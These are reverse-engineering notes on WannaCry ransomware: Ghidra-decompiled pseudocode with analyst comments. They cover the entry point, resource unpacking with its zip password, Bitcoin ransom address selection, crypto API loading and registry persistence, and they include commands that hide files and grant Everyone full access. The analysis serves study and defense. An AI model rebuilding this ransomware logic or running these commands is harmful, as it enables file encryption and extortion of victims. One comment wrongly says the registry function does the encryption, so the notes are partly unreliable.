Random notes from ghidra



// **WinMain****:**


/* This file, or atleast part of it, was in the old 1831.bin file and was the entry point.
   
   In this version it is combined with the original .exe 
   
   
   There is a fork of the program path here, if /i argument is passed in cmd then a certain workflow
   begins and vice versa */

int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdShow)

{
  bool bVar1;
  int *argv;
  char ***argv2;
  undefined3 extraout_var;
  DWORD DVar2;
  short *psVar3;
  code *pcVar4;
  int i;
  undefined4 *j;
  undefined local_6e8 [1240];
  char filename [520];
  uint local_8;
  char *_s_/i;
  
  filename[0] = executable_path?;
  j = (undefined4 *)(filename + 1);
  for (i = 129; i != 0; i = i + -1) {
    *j = 0;
    j = j + 1;
  }
  *(undefined2 *)j = 0;
  *(undefined *)((int)j + 2) = 0;
  GetModuleFileNameA((HMODULE)0x0,filename,520);
  Rand_string_gen((char *)&randomstring);
  argv = (int *)__p___argc();
                    /* if class here checks if there is 1 argument for argc REMEMBER argc == 2 means
                       if ONE argument is supplied or not. */
  if (*argv == 2) {
                    /* clear bytes and then you can uncover c string '/i' */
    _s_/i = s_/i_0040f538;
    argv2 = (char ***)__p___argv();
                    /* strcmp compares the first argument  strcmp(arg[1]) with "/i" */
    i = strcmp((*argv2)[1],_s_/i);
    if ((i == 0) &&
       (bVar1 = create_hidden_directory((wchar_t *)0x0), CONCAT31(extraout_var,bVar1) != 0)) {
      CopyFileA(filename,s_tasksche.exe_0040f4d8,0);
      DVar2 = GetFileAttributesA(s_tasksche.exe_0040f4d8);
      if ((DVar2 != 0xffffffff) && (i = FUN_00401f5d(), i != 0)) {
        return 0;
      }
    }
  }
  _s_/i = strrchr(filename,0x5c);
  if (_s_/i != (char *)0) {
    _s_/i = strrchr(filename,0x5c);
    *_s_/i = '\0';
  }
  SetCurrentDirectoryA(filename);
  Registry_Edit(1);
  2058_LoadnSize((HMODULE)0x0,s_WNcry@2ol7_0040f52c);
  Bitcoin_addresses();
  Command4perms(s_attrib_+h_._0040f520,0,(LPDWORD)0x0);
  Command4perms(s_icacls_._/grant_Everyone:F_/T_/C_0040f4fc,0,(LPDWORD)0x0);
  i = FUN_0040170a();
  if (i != 0) {
    FUN_004012fd();
    i = FUN_00401437(local_6e8,(LPCSTR)0x0,0,0);
    if (i != 0) {
      local_8 = 0;
      psVar3 = (short *)FUN_004014a6(local_6e8,s_t.wnry_0040f4f4,&local_8);
      if (((psVar3 != (short *)0x0) &&
          (argv = (int *)FUN_004021bd(psVar3,local_8), argv != (int *)0x0)) &&
         (pcVar4 = (code *)FUN_00402924(argv,s_TaskStart_0040f4e8), pcVar4 != (code *)0x0)) {
        (*pcVar4)(0,0);
      }
    }
    FUN_0040137a();
  }
  return 0;
}

// **2058.bin "Load and Size" ()****:** This section was huge in the older version, in this variant it is split up:

/* Load resource (previously 1831) *again* broken up from large function.
   
   
   param_1 is HMODULE 0X0
   
   
   Ok now it is changed to 2058 */

undefined4 __cdecl 2058_LoadnSize(HMODULE param_1,char *param_2)

{
  HRSRC hResInfo;
  HGLOBAL hResData;
  LPVOID res_LOCKED;
  DWORD r2058_Size;
  int *r2058_size#2;
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  char *pcVar4;
  int local_130;
  undefined4 local_12c [74];
  
                    /* This is obfuscated, I am guessing the end result will stil be 1831
                       
                       Ok it was changed to 2058 */
  hResInfo = FindResourceA(param_1,(LPCSTR)2058,&DAT_0040f43c);
  if (((hResInfo != (HRSRC)0x0) &&
      (hResData = LoadResource(param_1,hResInfo), hResData != (HGLOBAL)0x0)) &&
     (res_LOCKED = LockResource(hResData), res_LOCKED != (LPVOID)0x0)) {
    r2058_Size = SizeofResource(param_1,hResInfo);
                    /* passes the size to another variable to annoy readers */
    r2058_size#2 = (int *)FUN_004075ad(res_LOCKED,r2058_Size,param_2);
    if (r2058_size#2 != (int *)0) {
      local_130 = 0;
      puVar3 = local_12c;
                    /* some optimization here, this for loop was not a one liner before so this was
                       changed */
      for (iVar2 = 0x4a; iVar2 != 0; iVar2 = iVar2 + -1) {
        *puVar3 = 0;
        puVar3 = puVar3 + 1;
      }
      FUN_004075c4(r2058_size#2,-1,&local_130);
      iVar2 = local_130;
      pcVar4 = (char *)0x0;
      if (0 < local_130) {
        do {
          FUN_004075c4(r2058_size#2,(int)pcVar4,&local_130);
          iVar1 = strcmp((char *)local_12c,s_c.wnry_0040e010);
          if ((iVar1 != 0) ||
             (r2058_Size = GetFileAttributesA((LPCSTR)local_12c), r2058_Size == 0xffffffff)) {
            FUN_0040763d(r2058_size#2,pcVar4,(char *)local_12c);
          }
          pcVar4 = pcVar4 + 1;
        } while ((int)pcVar4 < iVar2);
      }
      FUN_00407656(r2058_size#2);
      return 1;
    }
  }
  return 0;
}


// **Bitcoin addresses function:**

/* This was in the past in a separate bin file named 1831.bin. The file was replaced with a zip file
   named 2058.bin/zip with different assets.
   
   And the addresses were combined into the original WC.EXE.
   
   The (presumably) old bin file had the lang archives within it, just that there was an unzip
   command in the bin file itself. 
   
   Now its replacement (2058.zip) is just a zip file. */

void Bitcoin_addresses(void)

{
  bool bVar1;
  undefined3 extraout_var;
  int iVar2;
  undefined local_31c [178];
  char local_26a [602];
  char *local_10 [3];
  
  local_10[0] = s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488;
  local_10[1] = s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464;
  local_10[2] = s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440;
  bVar1 = FUN_00401000(local_31c,1);
  if (CONCAT31(extraout_var,bVar1) != 0) {
    iVar2 = rand();
    strcpy(local_26a,local_10[iVar2 % 3]);
    FUN_00401000(local_31c,0);
  }
  return;

// **key_ApiCalls:**

undefined4 key_ApiCalls(void)

{
  HMODULE hModule;
  undefined4 uVar1;
  
  if (DAT_0040f894 == (FARPROC)0x0) {
    hModule = LoadLibraryA(s_advapi32.dll_0040e020);
    if (hModule != (HMODULE)0x0) {
      DAT_0040f894 = GetProcAddress(hModule,s_CryptAcquireContextA_0040f110);
      import_key = GetProcAddress(hModule,s_CryptImportKey_0040f100);
      Destroy_key = GetProcAddress(hModule,s_CryptDestroyKey_0040f0f0);
      encrypt_wkey = GetProcAddress(hModule,s_CryptEncrypt_0040f0e0);
      decrypt_wkey = GetProcAddress(hModule,s_CryptDecrypt_0040f0d0);
      _Generate_key = GetProcAddress(hModule,s_CryptGenKey_0040f0c4);
      if ((((DAT_0040f894 != (FARPROC)0x0) && (import_key != (FARPROC)0x0)) &&
          (Destroy_key != (FARPROC)0x0)) &&
         (((encrypt_wkey != (FARPROC)0x0 && (decrypt_wkey != (FARPROC)0x0)) &&
          (_Generate_key != (FARPROC)0x0)))) goto LAB_00401aec;
    }
    uVar1 = 0;
  }
  else {
LAB_00401aec:
    uVar1 = 1;
  }
  return uVar1;
}


**Registry Edit:** This section does the actual encryption

undefined4 __cdecl Registry_Edit(int set_registry)

{
  size_t current_dir_len;
  LSTATUS LVar1;
  int iVar2;
  undefined4 *software_s;
  undefined4 *puVar3;
  bool bVar4;
  HKEY hKey;
  BYTE registry_value;
  undefined4 local_2df;
  undefined4 software_s_buff [5];
  undefined4 local_c4 [45];
  DWORD local_10;
  int i;
  HKEY regWanaHandle;
  
  software_s = (undefined4 *)u_Software\_0040e04c;
  puVar3 = software_s_buff;
  for (iVar2 = 5; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = *software_s;
    software_s = software_s + 1;
    puVar3 = puVar3 + 1;
  }
  registry_value = '\0';
  regWanaHandle = (HKEY)0x0;
  software_s = local_c4;
  for (iVar2 = 0x2d; iVar2 != 0; iVar2 = iVar2 + -1) {
    *software_s = 0;
    software_s = software_s + 1;
  }
  software_s = &local_2df;
  for (iVar2 = 0x81; iVar2 != 0; iVar2 = iVar2 + -1) {
    *software_s = 0;
    software_s = software_s + 1;
  }
  *(undefined2 *)software_s = 0;
  *(undefined *)((int)software_s + 2) = 0;
                    /* wsc -> Wide string concatanation */
  wcscat((wchar_t *)software_s_buff,u_WanaCrypt0r_0040e034);
                    /* reads as Sofware\Wanacrypt0r */
  i = 0;
  do {
                    /* Again 3rd parameter is the output
                        */
    if (i == 0) {
                    /* This is HKEY_LOCAL_MACHINE */
      hKey = (HKEY)0x80000002;
    }
    else {
                    /* This is HKEY_CURRENT_USER */
      hKey = (HKEY)0x80000001;
    }
    RegCreateKeyW(hKey,(LPCWSTR)software_s_buff,&regWanaHandle);
                    /* Again 3rd parameter is the output */
    if (regWanaHandle != (HKEY)0x0) {
      if (set_registry == 0) {
        local_10 = 0x207;
        LVar1 = RegQueryValueExA(regWanaHandle,&DAT_0040e030,(LPDWORD)0x0,(LPDWORD)0x0,
                                 &registry_value,&local_10);
        bVar4 = LVar1 == 0;
        if (bVar4) {
          SetCurrentDirectoryA((LPCSTR)&registry_value);
        }
      }
      else {
        GetCurrentDirectoryA(0x207,(LPSTR)&registry_value);
        current_dir_len = strlen((char *)&registry_value);
        LVar1 = RegSetValueExA(regWanaHandle,&DAT_0040e030,0,1,&registry_value,current_dir_len + 1);
                    /* a new key is made in the registry and the current directory is put in it */
        bVar4 = LVar1 == 0;
      }
      RegCloseKey(regWanaHandle);
      if (bVar4) {
        return 1;
      }
    }
    i = i + 1;
    if (1 < i) {
      return 0;
    }
  } while( true );
}








  
